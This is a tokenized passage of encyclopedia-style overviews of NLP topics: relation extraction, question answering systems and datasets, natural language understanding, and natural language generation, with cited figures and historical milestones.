Subsequently , this kernel - based approach is followed by other researchers : kernels on dependency parse trees of Culotta and Sorensen ( 2004 ) ; subsequence and shortest dependency path kernels of Bunescu and Mooney ( 2005 ) ; convolutional parse kernels of Zhang et al .
( 2006 ) ; and composite kernels of Choi et al .
( 2009 ) .
Kambhatla takes a feature - based supervised classifier approach to relationship extraction .
A MaxEnt model is used along with lexical , syntactic and semantic features .
Since kernel methods are a generalization of feature - based algorithms , Zhao and Grishman ( 2005 ) extend Kambhatla 's work by including more syntactic features using kernels , then use SVM to pick out the most suitable features .
A relation graph from a binary classifier is used to find cliques .
Source : McDonald 's et al .
2005 , fig .
2 .
Since binary classifiers have been well studied , McDonald et al .
cast the problem of extracting higher - order relations into many binary relations .
This also makes the data less sparse and eases computation .
Binary relations are represented as a graph , from which cliques are extracted .
They find that probabilistic cliques perform better than maximal cliques .
The figure corresponds to some binary relations extracted from the sentence " John and Jane are CEOs at Inc. Corp. and Biz .
Corp. respectively .
" Results of TextRunner from processing 9 million web pages .
Source : Banko et al .
2007 , fig .
1 .
Banko et al .
propose Open Information Extraction along with an implementation that they call TextRunner .
In an unsupervised manner , the system is able to extract relationships without any human input .
Each tuple is assigned a probability and indexed for efficient information retrieval .
TextRunner has three components : self - supervised learner , single - pass extractor , and redundancy - based assessor .
Features extracted with the aid of a dependency parse tree .
Source : Mintz et al .
2009 , sec .
5 .
Mintz et al .
propose distant supervision to avoid the cost of producing hand - annotated corpus .
Using entity pairs that appear in Freebase , they find all sentences in which each pair occurs in unlabelled text , extract textual features and train a relation classifier .
These include both lexical and syntactic features .
They note that syntactic features are useful when patterns are nearby in the dependency tree but distant in terms of words .
In the early 2010s , distant supervision became an active area of research .
Use of words , embeddings and CNN for related classifications .
Source : Zeng et al .
2014 , fig .
1 and 2 .
Neural networks and word embeddings were first explored by Collobert et al .
( 2011 ) for a number of NLP tasks .
Zeng et al .
apply word embeddings and Convolutional Neural Network ( CNN ) to related classifications .
They treat relation classification as a multi - class classification problem .
Lexical features include the entities , their surrounding tokens , and WordNet hypernyms .
CNN is used to extract sentence level features , for which each token is represented as word features ( WF ) and position features ( PF ) .
Use of both recursive NN and convolution NN for relation classification .
Source : Liu et al .
2015 , fig .
3 .
Dependency between the shortest path and subtrees has been shown to be effective for relationship classification .
Liu et al .
propose a recursive neural network to model the dependency of subtrees , and a convolutional neural network to capture the most important features on the shortest path .
Generated rules are used to discover relations .
Source : Song et al .
2015 , fig .
4 .
Song et al .
present PKDE4J , a framework for dictionary - based entity extraction and rule - based relation extraction .
Primarily meant for biomedical field , they report F - measures of 85 % for entity extraction and 81 % for relation extraction .
The RE algorithm uses dependency parse trees , which are analyzed to extract heuristic rules .
They come up with 17 rules that can be applied to discern relations .
Examples of rules include verb in dependency path , nominalization , negation , active / passive voice , entity order , etc .
BiLSTMs used to jointly extract entities and their relations .
Source : Miwa and Bansal 2016 , fig .
1 .
Miwa and Bansal propose to jointly model the tasks of NER and RE .
A BiLSTM is used on word sequences to obtain the named entities .
Another BiLSTM is used on dependency tree structures to obtain the relations .
They also find that the shortest path dependency tree performs better than subtrees of full trees .
R - BERT architecture that uses BERT for relationship extraction .
Source : Wu and He 2019 , fig .
1 .
Wu and He apply BERT pre - trained language model to relationship extraction .
They call their model R - BERT .
Named entities are identified beforehand and are delimited with special tokens .
Since an entity can span multiple tokens , their start / end hidden token representations are averaged .
The output is a softmax layer with cross - entropy as the loss function .
On SemEval-2010 Task 8 , R - BERT achieved a state - of - the - art Macro - F1 score of 89.25 .
Other BERT - based models learn NER and RE jointly , or rely on topological features of an entity pair graph .
Comparing different QA datasets .
Source : Choi et al .
2018 , table 1 .
Search engines , and information retrieval systems in general , help us obtain relevant documents to any search query .
In reality , people want answers .
Question Answering ( QA ) is about giving a direct answer in the form of a grammatically correct sentence .
QA is a subfield of Computer Science .
It 's predominantly based on Information Retrieval and Natural Language Processing .
Both questions and answers are in natural language .
QA is also related to an NLP subfield called text summarization .
Where answers are long and descriptive , they 're probably summarized from different sources .
In this case , QA is also called focused summarization or query - based summarization .
There are lots of datasets to train and evaluate QA models .
By late 2010s , neural network models have brought state - of - the - art results .
Which are the broad categories of questions answered by QA systems ?
Conceptually , a question type has three facets .
Source : Oh et al .
2011 , fig .
1 .
Factoid questions are the simplest .
An example of this is " What is the population of the Bahamas ?
" Answers are short and factual , often identified by named entities .
Variations of factoid questions include a single answer , a list of answers ( such as " Which are the official languages of Singapore ?
" ) , or yes / no .
Questions typically ask what , where , when , who , who , or what is .
QA research started with factoid questions .
Later , research progressed to questions that sought descriptive answers .
" Why is the sky blue ?
" requires an explanation .
" What is global warming ?
" requires a definition .
Questions typically ask why , how or what .
Closed - domain questions are about a specific domain such as medicine , environment , baseball , algebra , etc .
Open - domain questions are regardless of the domain .
Open - domain QA systems use large collections of documents or knowledge bases covering diverse domains .
When the system is given a single document to answer a question , we call it reading comprehension .
If information has to be searched in multiple documents across domains , the term open - context open - domain QA should be used .
What are the main approaches or techniques used in question answering ?
Architecture of a knowledge - based QA system with attention computed between question and candidate answers .
Source : Zhang et al .
2016 , fig .
1 .
QA systems rely on external sources from where answers can be determined .
Broad approaches are the following : Information Retrieval - based : Extends traditional IR pipeline .
Reading comprehension is applied to each retrieved document to select a suitable named entity , sentence or paragraph .
This has also been called open domain QA .
The web ( or CommonCrawl ) , PubMed and Wikipedia are possible sources .
Knowledge - based : Facts are stored in knowledge bases .
Questions are converted ( by semantic parsers ) into semantic representations , which are then used to query the knowledge bases .
Knowledge could be stored in relational databases or as RDF triples .
This has also been called semantic parsing - based QA .
DBpedia and Freebase are possible knowledge sources .
Hybrid : IBM 's DeepQA is an example that combines both IR and knowledge approaches .
What are some variations of question answering systems ?
Question answering in dialogue context .
Source : Choi et al .
2018 , fig .
1 .
We note the following variations or specializations of QA systems : Visual QA ( VQA ) : Input is an image ( or video ) rather than text .
VQA is at the intersection of computer vision and NLP .
Conversational QA : In dialogue systems , there 's a continuity of context .
The current question may be incomplete or ambiguous , but it can be resolved by looking at past interactions .
CoQA and QuAC are two datasets for this purpose .
Compositional QA : Complex questions are decomposed into smaller parts , each answered individually , and then the final answers are composed .
This technique is used in VQA as well .
Domain - Specific QA : Biomedical QA is a specialized field where both domain patterns and knowledge can be exploited .
AQuA is a dataset specific to algebra .
Context - Specific QA : Social media texts are informal .
Models that do well on newswire QA have been shown to do poorly on tweets .
Community forums ( Quora , StackOverflow ) provide multi - sentence questions with often long answers that are upvoted or downvoted .
What are the key challenges faced by question answering systems ?
QA systems face two challenges : question complexity ( depth ) and domain size ( breadth ) .
Systems are good at either of these , but not both .
An example of depth is " What 's the cheapest bus to Chichen Itza leaving tomorrow ?
" A much simpler question is " Where is Chichen Itza ?
" Common sense reasoning is challenging .
For example , ' longest river ' requires reverse sorting by length ; ' by a margin of ' involves some sort of comparison ; ' at least ' implies a lower cut - off .
Temporal or spatial questions require reasoning about time or space relations .
Lexical gap means that a concept can be expressed using different words .
For example , we 're looking for a ' city ' but the question asks about a ' venue ' .
Approaches to solving this include string normalization , query expansion , and entailment .
Ambiguity occurs when a word or phrase can have multiple meanings , only one of which is intended in a given context .
The correct meaning can be obtained via corpus - based methods ( distributional hypothesis ) or resource - based methods .
Sometimes the answer is distributed across different sources .
QA systems need to align different knowledge ontologies .
An alternative is to decompose the question into simpler queries and combine the answers later .
What are the steps in a typical question answering pipeline ?
Pipeline of IR - based factoid QA systems .
Source : Jurafsky and Martin 2019 , fig .
25.2 .
In IR - based factoid QA , tokens from the question or the question itself form the query to the IR system .
Sometimes stopwords may be removed , the query rephrased or expanded .
From the retrieved documents , relevant sentences or passages are extracted .
Named entities , n - gram overlap , question keywords , and keyword proximity are some techniques at this stage .
Finally , a suitable answer is picked .
We can train classifiers to extract an answer .
Features include answer type , matching pattern , number of matching keywords , keyword distance , punctuation location , etc .
Neural network models are also common for answer selection .
For knowledge - based QA , the first step is to invoke a semantic parser to obtain a logical form for querying .
Such a parser could be rule - based to extract common relations , or it could be learned via supervised machine learning .
More commonly , semi - supervised or unsupervised methods are used based on web content .
Such methods help us discover new knowledge relations in unstructured texts .
Relevant techniques include distant supervision , open information extraction and entity linking .
How are neural networks being used in question answering ?
The widespread use of neural networks for NLP started with distributed representation of words .
A feedforward model learned the representation as it was being trained on a language modelling task .
In these representations , semantically similar words will be close to one another .
The next development was towards compositional distributional semantics , where sentence - level representations are composed from word representations .
These were more useful for question answering .
Iyyer et al .
reduced dependency on parse trees to vector representations that were used to train an RNN .
Yu et al .
used CNN for answer selection .
A common approach to answer selection is to look at the similarity between question and answer in the semantic space .
Later models added an attention layer between the question and its candidate answers .
Tan et al .
evaluated BiLSTMs with attention and CNN .
The Dynamic Coattention Network ( DCN ) is also based on attention .
Facebook researchers combined a seq2seq model with multitasking .
Transformer architecture has been applied to QA .
In fact , QA was one of the tasks for which BERT was fine - tuned ( on SQuAD ) and evaluated .
BERTserini used fine - tuned BERT along with information retrieval from Wikipedia .
What are some useful datasets for training or evaluating question answering models ?
Distribution of trigram prefixes in questions of SQuAD and CoQA datasets .
Source : Heidenreich 2018 , fig .
3 .
Datasets are used for training and evaluating QA systems .
Based on the design and makeup , each dataset might evaluate different aspects of the system better .
Among the well - known datasets are Stanford Question Answering Dataset ( SQuAD ) , Natural Question ( NQ ) , Question Answering in Context ( QuAC ) and HotpotQA .
All four are based on Wikipedia content .
Conversational Question Answering ( CoQA ) is a dataset that 's based on Wikipedia plus other sources .
Wikipedia often presents data on tables .
WikiTableQuestions is a dataset in which answers are in tables rather than freeform text .
TyDi QA is a multilingual dataset .
TweetQA takes its data from Twitter .
Question Answering over Linked Data ( QALD ) is a series of datasets created from knowledge bases such as DBpedia , MusicBrainz , Drugbank and LinkedSpending .
Other datasets to note are ELI5 , ShARC , MS MARCO , NewsQA , CMU , Wikipedia Factoid QA , CNN / DailyMail QA , Microsoft WikiQA , Quora Question Pairs , CuratedTREC , WebQuestions , WikiMovies , GeoQuery and ATIS .
Papers With Code lists dozens of datasets along with their respective state - of - the - art models .
An example specification list for a question .
Source : Green et al .
1961 .
MIT researchers implemented a program named Baseball .
It reads a question from a punched card .
It references a dictionary of words and idioms to generate a " specification list " , which is a canonical expression of what the question is asking .
Content analysis involves syntactic phrase structures .
Bertram Raphael at MIT publishes a memo titled Operation of a Semantic Question - Answering System .
He describes a QA model that accepts a restricted form of English .
Factual information comes from a relational model .
The program is written in LISP .
Raphael credits LISP 's list - processing capability for making the implementation a lot easier .
Developed at MIT , START goes online .
This is probably the world 's first web - based QA system .
It can answer questions about places , people , movies , dictionary definitions , etc .
With the growth of the web , AskJeeves has launched as an online QA system .
However , it basically does pattern matching against a knowledge base of questions and returns curated answers .
If there 's no match , it falls back to a web search .
In February 2006 , the system was rebranded as Ask .
At the 8th Text REtrieval Conference ( TREC-8 ) , a Question Answering track was introduced .
This is to foster research in QA .
TREC-8 focuses on only open - domain closed - class questions ( fact - based short answers ) .
At future TREC events , the QA track continues to produce datasets for training and evaluation .
Coarse classes ( bold ) and fine classes from TREC-10 dataset .
Source : Li and Roth 2002 , table 1 .
It 's helpful to identify the type of question being asked .
Li and Roth propose a machine learning approach to question classification .
Such a classification imposes constraints on potential answers .
Due to ambiguity , their model allows for multiple classes for a single question .
For example , " What do bats eat ?
" could belong to three classes : food , plant , animal .
The features used for learning include words , POS tags , chunks , head chunks , named entities , semantically related words , n - grams , and relations .
Architecture of IBM 's DeepQA .
Source : Ferrucci et al .
2010 , fig .
6 .
After about three years of effort , IBM Watson competes at human expert levels in terms of precision , confidence and speed at Jeopardy !
quiz show .
Its DeepQA architecture integrates many content sources and NLP techniques .
Answer candidates come with confidence measures .
They 're then scored using supporting evidence .
Watson wins Jeopardy !
in February 2011 .
Use of CNN to obtain a sentence representation .
Source : Yu et al .
2014 , fig .
1 .
Yu et al .
look at the specific task of answer selection .
Using distributed representations , they look for answers that are semantically similar to the question .
This is a departure from a classification approach that uses hand - crafted syntactics and semantic features .
They use a bigram model with a convolutional layer and an average pooling layer .
These capture syntactic structures and long - term dependencies without relying on external parse trees .
Embeddings , BiLSTMs and attention used in DrQA .
Source : Jurafsky and Martin 2019 , fig .
25.7 .
Chen et al .
use Wikipedia as the knowledge source for open - domain QA .
Answers are predicted as text spans .
Earlier research typically considers a short piece of already identified text .
Since the present approach searches over multiple large documents , they call it " machine reading at scale " .
Called DrQA , this system integrates document retrieval and document reading .
Bigram features and bag - of - words weighted with TF - IDF are used for retrieval .
The reader uses BiLSTM each for the question and passages , with attention between the two .
Fine - tuning of BERT for question answering .
Source : Devlin et al .
2019 , fig .
4c .
Researchers at Google released BERT that 's trained on 3.3 billion words of unlabelled text .
BERT is a pre - trained language model .
As a sample task , they fine - tune BERT for question answering .
SQuAD v1.1 and v2.0 datasets are used .
The question and text containing the answer are concatenated to form the input sequence .
The start and end tokens of the answer are predicted using softmax .
For questions without answers , start / end tokens point to the ` [ CLS ] ` token .
Google released the Natural Questions ( NQ ) dataset .
It has 300 K pairs plus 16 K questions with answers from five different annotators .
The answer comes from a Wikipedia page and the model is required to read the entire page .
The questions themselves are based on real , anonymized , aggregated queries from Google Search .
Answers can be yes / no , long , long and short , or no answer .
SQuAD 2.0 entry on Steam_engine with some question - answer pairs .
Source : SQuAD 2020b .
On the SQuAD 2.0 dataset , many implementations started surpassing human performance .
Many of these are based on the transformer neural network architecture , including BERT , RoBERTa , XLNet , and ALBERT .
Let 's note that SQuAD 2.0 combines 100 K questions from SQuAD 1.1 plus 50 K unanswerable questions .
When there 's no answer , models are required to abstain from answering .
Unsupervised question generation to train a QA model .
Source : Lewis et al .
2019 , fig .
1 .
Since datasets are available only for some domains and languages , Lewis et al .
propose a method to synthesize questions to train QA models .
Passages are randomly selected from documents .
Random noun phrases or named entities are picked as answers .
" Fill - in - the - blanks " questions are generated .
Using neural machine translation ( NMT ) , these are converted into natural questions .
In Finnish , the words ' day ' and ' week ' are represented differently in question and answer .
Source : Clark 2020 .
Google Research releases TyDi QA , a typologically diverse multilingual dataset .
It has 200 K question - answer pairs from 11 languages .
To avoid sharing words in a pair , a human was asked to frame a question when they did n't know the answer .
Google Search identified a suitable Wikipedia article to answer the question .
The person then marked the answer .
Researchers expect their model to generalize well to many languages .
Some aspects of the text that NLU understand .
Source : Waldron 2015 .
Given some text , Natural Language Understanding ( NLU ) is about enabling computers to understand the meaning of the text .
Once meaning is understood , along with the context , computers can interact with humans in a natural way .
If a human were to ask a computer a question , NLU attempts to understand the question .
Such an understanding leads to a semantic representation of the input text .
The representation is then fed into other related systems to generate a suitable response .
Language is what makes us human and manifests our intelligence .
NLU is a challenging NLP task , often considered an AI - Hard problem .
It combines elements of syntactic and semantic parsing , and predicate logic .
How is NLU different from NLP ?
NLP = NLU + NLG .
Source : Lucid Thoughts 2019 .
Natural Language Processing ( NLP ) is an umbrella term that includes both Natural Language Understanding ( NLU ) and Natural Language Generation ( NLG ) .
NLP turns unstructured data into structured data .
NLU is more specifically about the meaning or semantics .
For example , if the user is asking about today 's weather or the traffic conditions on a particular route , NLU helps in understanding the intent of the user 's query .
NLG is invoked when framing answers in natural language .
Voice - based human - computer interaction such as Apple Siri or Amazon Alexa is a typical example .
Speech is converted to text using Automatic Speech Recognition ( ASR ) .
NLU then takes the text and outputs a semantic representation of the input .
Once relevant facts are gathered , NLG helps in form the answer .
Text - to - Speech ( TTS ) synthesis finally converts the textual answer to speech .
Apart from sub - fields such as ASR and TTS , NLP consists of basic language processing tasks such as sentence segmentation , tokenization , handling stopwords , lemmatization , POS tagging and syntactic parsing .
There 's also Natural Language Inference ( NLI ) .
Given a premise , NLI attempts to infer if a hypothesis is true , false or indeterminate .
What are the typical challenges in NLU ?
Consider the sentence " We saw her duck " .
' We ' could be a Chinese name .
' Her ' could refer to another person introduced earlier in the text .
' Duck ' could refer to a bird or the action of ducking .
Likewise , ' saw ' could be a noun or a verb .
This variety of interpretations is what makes NLU a challenging task .
This is because language is highly ambiguous .
Ambiguity could be syntactic , such as " I saw the man with the binoculars " .
An example of word sense ambiguity is " I need to go to the bank " .
Synonymy is also a problem for NLU .
This is when many different sentences express the same meaning .
This is because language allows for varied and complex constructions .
Humans often communicate with errors and less than perfect grammar .
NLU systems have to account for this as well .
In addition , human language has sarcasms .
A sentence may have a literal meaning ( semantics ) but also a different intended meaning ( pragmatics ) .
Could you explain semantic parsing ?
Semantic parsing translates directions to a robot into procedural steps .
Source : MacCartney 2019 , slide 20 .
Semantic parsing translates text into a formal meaning representation .
This representation is something that 's easier for machines to process .
In some ways , semantic parsing is similar to machine translation except that in the latter , the final representation is human readable .
The form of the representation depends on the purpose .
It could use scalars or vectors .
It could be continuous or discrete , such as tuples for relationship extraction .
Consider the question " Which country had the highest carbon emissions last year ?
" Assuming the answer is to be searched in a relational database , the representation would take the form of a database query : ` SELECT country.name FROM country , co2_emissions WHERE country.id = co2_emissions.country_id AND co2_emissions.year = 2014 ORDER BY co2_emissions.volume DESC LIMIT 1 ` .
In a robotic application , the representation might be a sequence of steps to guide the robot from one place to another .
In smartphones that process voice commands , the representation might be categorized into intents and their arguments .
Which are the typical NLU tasks ?
Some NLU tasks and applications .
Source : SciForce 2019 .
Since NLU 's focus is on meaning , here are some typical NLU tasks : Sentiment Analysis : Understand if the text is expressing positive or negative sentiment .
Emotion detection is a more granular form of sentiment analysis .
Named Entity Recognition : Identify and classifying named entities ( Person , Organization , Location , etc .
) in the text .
Relation Extraction : Identify and classify the relationship between named entities .
Semantic Role Labelling : Identify and label parts of a sentence with their semantic roles .
This helps in answering questions of the type " who did what to whom " .
Word Sense Disambiguation : Looking at the context of word usage , figure out the correct sense since a word can have multiple senses .
Inductive Reasoning : Given some facts , use logic to infer relations not stated explicitly in the text .
When combined with NLG , other tasks that require NLU are question answering , text summarization , chatbots , and voice assistants .
The use of NLU in chatbots and voice assistants has become increasingly more important .
NLU helps chatbots to better understand user intent , and to respond correctly and in a more natural way .
Could you share examples of real - world NLU systems ?
Many examples are in relation to chatbots or voice assistants .
Microsoft offers Language Understanding Intelligent Service ( LUIS ) that developers can use to quickly build natural language interfaces into their apps , bots and IoT devices .
A similar offering from IBM is Watson Assistant .
IBM also offers Watson Natural Language Understanding to extract entities , keywords , categories , sentiment , emotion , relations , and syntax .
From Google , we have Dialogflow for voice and text - based conversational interfaces .
Other examples are Amazon Lex , SAP Conversational AI , , Rasa NLU , and Snips .
Which are the main approaches to NLU ?
One approach is to initialize an NLU system with some knowledge , structure and common sense .
The system then learns from experience via reinforcement learning .
Since some see this as introducing biases , an alternative approach is to require the system to learn everything by itself .
Just as humans learn by interacting with their environments , NLU systems can also benefit from such embodied learning .
The ability to detect human emotions can lead to deeper understanding of language .
These two approaches are mirrored in Western philosophy by nativism ( core inbuilt knowledge ) and empiricism ( learned by experience ) .
NLU systems could combine elements of statistical approaches with knowledge resources such as FrameNet or Wikidata .
FrameNet is a lexical database of word senses with examples .
FrameNet can therefore help NLU in obtaining common - sense knowledge .
Other common - sense datasets include Event2Mind and SWAG .
Su et al .
noted the duality between NLU and NLG .
Via dual supervised learning , they trained a model to jointly optimize on both tasks .
Their approach gave a state - of - the - art F1 score for NLU .
There are four categories of NLU systems : distributional , frame - based , model - theoretical , interactive learning .
Which are the common benchmarks for evaluating NLU systems ?
The General Language Understanding Evaluation ( GLUE ) benchmark has nine sentence or sentence - pair NLU tasks .
It has a good diversity of genres , linguistic variations and difficulty .
It 's also model agnostic .
There 's also a leaderboard .
This was extended in 2019 to Super GLUE .
Quora Question Pairs ( QQP ) has question pairs .
The task is to determine if two questions mean the same .
Sharma et al .
showed that a Continuous Bag - of - Words neural network model gave the best performance .
Incidentally , QQP is included in GLUE .
SentEval is a toolkit for evaluating the quality of universal sentence representations .
The tasks include sentiment analysis , semantic similarity , paraphrase detection , entailment , and more .
CLUTRR is a diagnostic benchmark suite for inductive reasoning .
It was created to evaluate if NLU systems can generalize in a systematic and robust way .
For evaluating chatbots , Snips released three benchmarks for built - in intents and custom intent engines .
Most models are trained to exploit statistical patterns rather than learn the meaning .
Hence , it 's easy for someone to construct examples to expose how poorly a model performs .
Inspired by this , Adversarial NLI is another benchmark dataset that was produced by having humans in the training loop .
Are current NLU systems capable of real understanding ?
Back in 2019 , it was reported that NLU systems are doing little more than pattern matching .
There 's no real understanding in terms of agents , objects , settings , relations , goals , beliefs , etc .
OpenAI 's GPT-2 was trained on 40 GB of data with no prior knowledge .
When prompted with a few words , GPT-2 can complete the sentence sensibly .
But despite its fluency , GPT-2 does n't understand what it 's talking about .
It fails to answer simple questions .
In other words , it 's good at NLG but not at NLU .
Language Models ( LMs ) have proven themselves in many NLP tasks .
However , their success in reasoning has been shown to be poor or context - dependent .
LMs capture statistics of the language rather than reasoning .
In other words , prediction does not imply or equate to understanding .
The failure to " understand " could be due to lack of grounding .
For example , dictionaries define words in terms of other words , which too are defined by other words .
Real understanding can come only when words are associated with sensory experiences grounded in the real world .
Without grounding , NLU systems are simply mapping a set of symbols to another set or representation .
Joseph Weizenbaum at MIT created ELIZA , a program that takes inputs and responds in the manner of a psychotherapist .
ELIZA has no access to knowledge databases .
It only looks at keywords , does pattern matching and gives sensible responses .
Many users get fooled by ELIZA 's human - like behaviour , although Weizenbaum insists that ELIZA has no understanding of either language or the situation .
A typical task given to the robot in SHRDLU .
Source : Winograd 1971 , fig .
11 .
Terry Winograd at MIT describes SHRDLU in his PhD thesis .
The task is to guide a robotic arm to move children 's blocks .
SHRDLU can understand block types , colours , sizes , verbs describing movements , and so on .
In later years , SHRDLU was considered a successful AI system .
However , attempts to apply it to complex real - world environments prove disappointing .
A modern variation of SHRDLU is SHRDLURN due to Wang et al .
( 2016 ) .
A sentence is understood within the frame of ' Commercial Transaction ' .
Source : Yao 2017 .
Marvin Minsky at MIT publishes A Framework for Representing Knowledge .
He defines a frame as a structure that represents a stereotyped situation .
Given a situation , a suitable frame is selected along with its associated information .
Then it 's customized to fit the current situation .
This is the frame - based approach to NLU .
Pereira and Warren developed CHAT-80 , a natural language interface for databases .
Implemented in Prolog , it uses hand - built lexicon and grammar .
It can answer questions about geography , such as " What countries border Denmark ?
" Apple releases the Macintosh 128 K along with a computer mouse .
Although the mouse was invented 20 years earlier , it was the Macintosh that made it popular , and with it the Graphical User Interface ( GUI ) .
This causes some companies to change their focus from research into natural language interfaces to the adoption of GUIs .
Single - symbol SCT for fare.fare_id for ATIS task .
Source : Kuhn 1995 , fig .
1 .
Kuhn proposes a Semantic Classification Tree ( SCT ) that automatically learns semantic rules from training data .
This overcomes the need to hand code and debug large number of rules .
The learned rules are seen to be robust to grammatical and lexical errors in input .
In general , the 1990s saw a growing use of statistical approaches to NLU .
Gobbi et al .
compare many different algorithms used for concept tagging , a sub - task of NLU .
Among the algorithms compared are generative ( WFST ) , discriminative ( SVM , CRF ) and neural networks ( RNN , LSTM , GRU , CNN , attention ) .
LSTM - CRF models show the best performance .
Adding a CRF top layer to a neural network improves performance with only a modest increase in the number of parameters .
Concepts ( meaning space ) and words ( linguistic space ) .
Source : Khashabi et al .
2019 , fig .
1 .
Reasoning is one of the tasks of NLU with practical use in applications such as question answering , reading comprehension , and textual entailment .
In a graph - based approach , Khashabi et al .
show the impossibility of reasoning in a noisy linguistic graph if it requires many hops in the meaning graph .
Meaning space is internal conceptualization in the human mind .
It 's free of noise and uncertainty .
Linguistic space is where thought is expressed via language and has plenty of room for imperfections .
NLG and some of its sub - fields .
Source : Santhanam and Shaikh 2019 , fig .
1 .
There 's a lot of structured data that 's perhaps easier to understand if described in a natural language .
Highlights from a financial spreadsheet , next week 's weather prediction , and a short summary of a long technical report are some examples .
Natural Language Generation ( NLG ) is the process of generating descriptions or narratives in natural language from structured data .
NLG is a sub - field of Natural Language Processing ( NLP ) .
NLG often works closely with Natural Language Understanding ( NLU ) , another sub - field of NLP .
Where input is unstructured text , NLU helps in producing a structured representation that can be consumed by NLG .
Generating language uses more of our brain than understanding it .
Likewise , computers might find NLG a more difficult task than NLU .
A mature NLG system can free humans from mundane writing , create narratives quickly , enable almost real - time reporting , and streamline operations .
What are some applications of NLG ?
When comparing products , NLG is used to explain recommendations .
Source : CoGenTex 2020 .
There are plenty of practical NLG applications : analysis for business intelligence dashboards , IoT device status and maintenance reporting , individual client financial portfolio summaries , personalized customer communications , and more .
NLG , along with NLU , is at the core of chatbots and voice assistants .
A familiar example might be Gmail 's Smart Compose .
It reads email content and suggests short responses .
The Associated Press uses NLG to generate thousands of corporate earnings reports in seconds .
During the December 2019 UK elections , BBC News published 689 local stories of 100 K words in 10 hours .
Public datasets were used at the input and articles were generated in a style and tone suited to local audiences .
For computer science domain , NLG has been used to write specifications from UML diagrams , or describe source code changes .
Forge.ai processes unstructured data using mainly supervised NLU models .
However , training data is limited .
They overcame this by using NLG to synthesize training data .
They used human - annotated examples plus knowledge sources .
Similarly , synthesized electronic health records can enable de - identified data sharing among healthcare providers and train ML models .
What 's expected of a good NLG system ?
Overview of the NLG system .
Source : Bateman and Zock 2005 , fig .
15.1 .
NLG must include in its response information that 's most relevant to the user in the current context .
This includes the level of detail that 's to be included .
For effective communication , information must be presented in a sensible order .
Thus , organization and structure are important .
One sentence must follow logically from another .
Likewise , NLG must know when to group them into paragraphs or even sections .
NLG must conform to the syntax of the language .
In addition , it 's a good idea to use common expressions .
A sophisticated system could be trainable , domain - independent , and even capable of sarcasms and idiomatic expressions .
Style matters .
If the intent is to present a high - level financial summary to top management , the writing style must be formal , concise and fact - based .
If the intent is to convince readers of a certain point of view , the style could be argumentative with references to supporting evidence .
On the whole , NLG is about making choices and pursuing specific communicative goals .
What 's the typical pipeline in an NLG application ?
Workings of the Arria NLG Engine .
Source : Arria 2016 .
A typical NLG pipeline has these basic steps : Content Determination and Text Planning : Determine the information to be communicated .
Structure the information .
It 's also called Macro Planning or Document Planning .
Information could come from a knowledge base .
Selection of information must consider goals and preferences of both the writer and reader .
Sentence Planning : Decide how information must be split into sentences and paragraphs .
Plan for a flowing narrative .
Also called Micro Planning , this involves techniques such as referring expressions , aggregation , lexicalization and grammaticalization .
Surface Realization : Generate individual sentences in a grammatically correct manner .
This involves syntax selection and inflection .
Physical Presentation : The output could be written or spoken text .
Either way , this step is articulation , punctuation and layout .
Could you describe the main components or tasks in NLG ?
Illustrating a few components of NLG in the medical domain .
Source : Gatt and Krahmer 2018 , fig .
1 .
We describe a few NLG components : Aggregation : Combining two sentences into one using a conjunction , such as " Sam has high blood pressure and low blood sugar .
" Aggregation could also be applied to paragraphs and higher - order structures .
Lexicalization : This is about word choice .
Between ' depart ' and ' leave ' , " the train departed " is more formal than " the train left " .
Referring to Expression Generation : Using preceding context , select words or phrases to identify domain entities .
An example is the use of pronouns , such as " I just saw Mrs. Black .
She has a high temperature .
" Using Discourse Markers : The inclusion of the word ' also ' , makes this sentence more fluent : " If Sam goes to the hospital , he should also go to the store .
" Linguistic Realization : Consider the sentence " There are 20 trains each day from Aberdeen to Glasgow .
" Following syntactic rules , NLG has added function words ' from ' and ' to ' .
Due to morphology , the plural form of ' train ' has been used .
Due to orthography , the first word is capitalized and a full stop added at the end .
Which are the main technical approaches to building NLG systems ?
Illustrating the use of Markov Chain in NLG .
Source : Dejeu 2017 .
We have two approaches to NLG : Template - based : Texts have pre - defined structure with gaps .
Gaps are filled with data .
These systems have evolved to allow greater control via scripts and business rules .
These have developed further to include a linguistic capability to generate grammatically correct text .
Dynamic Creation : At a micro level , sentences are created dynamically from semantic representations and a desired linguistic structure .
At a macro level , sentences are organized into a logical narrative as suited to the audience and the purpose of communication .
For dynamic creation of text , a Markov Chain model was initially applied .
Given the current word and its relationships with other words , this model predicts or generates the next word .
However , such models often lack structure and context .
More recently , Language Modelling has been applied to NLG .
Given recent words , the model predicts the next word .
An n - gram model is a specific way to build a language model .
Later , neural networks were successfully applied to language modelling .
Some classify NLG into Basic NLG , Templated NLG and Advanced NLG .
How have neural networks been applied to build NLG models ?
BERT is used for question generation , one token at a time .
Source : Chan and Fan 2019 , fig .
2 .
RNNs , LTSMs and transformer networks have been used for NLG models .
RNNs exploit the sequential nature of text and " remember " previous words to predict the next word .
LSTMs are better than RNNs at remembering longer word sequences .
They also have a mechanism to selectively forget when the context changes .
Transformers have become popular due to their state - of - the - art performance .
They look at the relationships between words in context .
All words are represented individually in the vector space instead of reducing them to a single fixed - length vector .
Transformers have been used to build language models and thereby enable NLG .
Two popular ones are BERT and GPT-2 .
However , it 's been remarked that GPT-2 lacks language understanding .
Neural networks typically take an end - to - end approach to NLG .
We could use an encoder - decoder architecture along with an attention layer .
The encoder produces a hidden representation of the input text .
The decoder generates the text .
Compared to template - based systems , neural network models give less control but are more flexible and expressive .
How can I evaluate NLG models ?
Possible evaluation criteria and methods for NLG .
Source : Gatt and Krahmer 2018 , fig .
8 .
Evaluating NLG systems is a challenge in itself and this has been addressed since the mid-1990s .
Evaluations are useful to assess the underlying theory of an NLG system , compare two NLG systems , or determine if a particular is showing improvements .
In black box evaluation , we evaluate the entire system .
In glass box evaluation , we evaluate the system 's component parts , such as document structuring or aggregation .
Evaluations should look at accuracy ( conveying the desired meaning ) and fluency ( text flows and is readable ) .
These two factors are not necessarily correlated .
Evaluations can be by humans or automated .
Multiple methods and metrics are preferred .
Evaluation metrics can be word - based ( TER , BLEU , ROUGE ) , grammar - based ( readability , spelling errors , characters per word , etc .
) or measure semantic similarity .
Another way to categorize the metrics is n - gram overlap ( BLEU , GTM , CIDEr ) , content overlap ( MASI , SPICE ) and string distance ( Levenshtein , TER ) .
BLEU has been criticized by researchers .
The E2E NLG Challenge ( 2017 - 18 ) used five metrics : BLEU , NIST , METEOR , ROUGE - L , and CIDEr ; plus RankME .
Rank - based Magnitude Estimation ( RankME ) enables reliable and consistent human evaluation .
Could you describe some tools to help with NLG ?
